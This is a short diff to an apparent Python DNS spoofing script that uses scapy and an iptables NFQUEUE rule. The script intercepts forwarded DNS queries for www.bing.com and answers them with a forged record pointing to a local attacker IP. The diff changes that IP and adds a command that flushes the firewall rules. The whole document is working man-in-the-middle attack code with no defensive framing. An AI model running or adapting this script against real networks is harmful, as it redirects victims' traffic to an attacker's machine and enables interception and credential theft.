@@ -22,6 +22,7 @@ queue_position = get_arguments()
 s_iptable = f'iptables -I FORWARD -j NFQUEUE --queue-num {str(queue_position)}'
 
 # call function
+subprocess.call('iptables --flush', shell=True)
 subprocess.call(s_iptable, shell=True)
 print(s_iptable)
 
@@ -32,7 +33,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.bing.com" in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.242")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.104")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
